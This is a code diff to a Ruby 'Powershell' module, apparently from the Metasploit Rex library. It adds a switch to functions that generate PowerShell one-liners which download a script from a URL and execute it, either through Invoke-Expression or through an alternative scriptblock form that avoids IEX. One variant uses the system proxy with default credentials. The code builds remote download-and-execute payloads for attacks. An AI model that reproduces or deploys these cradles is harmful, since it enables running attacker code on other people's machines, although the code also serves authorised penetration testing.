@@ -77,10 +77,15 @@ module Powershell
     # Download and execute string via HTTP
     #
     # @param url [String] string to download
+    # @param iex [Boolean] utilize invoke-expression to execute code
     #
     # @return [String] PowerShell code to download and exec the url
-    def self.download_and_exec_string(url)
-      %Q^ IEX ((new-object net.webclient).downloadstring('#{url}'))^
+    def self.download_and_exec_string(url, iex = true)
+      if iex
+        %Q^ IEX ((new-object net.webclient).downloadstring('#{url}'))^
+      else
+        %Q^&([scriptblock]::create((new-object net.webclient).downloadstring('#{url}')))^
+      end
     end
 
     #
@@ -88,14 +93,19 @@ module Powershell
     # as a string and execute the contents as PowerShell
     #
     # @param url [String] string to download
+    # @param iex [Boolean] utilize invoke-expression to execute code
     #
     # @return [String] PowerShell code to download a URL
-    def self.proxy_aware_download_and_exec_string(url)
+    def self.proxy_aware_download_and_exec_string(url, iex = true)
       var = Rex::Text.rand_text_alpha(1)
       cmd = "$#{var}=new-object net.webclient;"
       cmd << "$#{var}.proxy=[Net.WebRequest]::GetSystemWebProxy();"
       cmd << "$#{var}.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;"
-      cmd << "IEX $#{var}.downloadstring('#{url}');"
+      if iex
+        cmd << "IEX $#{var}.downloadstring('#{url}');"
+      else
+        cmd << "&([scriptblock]::create($#{var}.downloadstring('#{url}'));"
+      end
       cmd
     end
   end
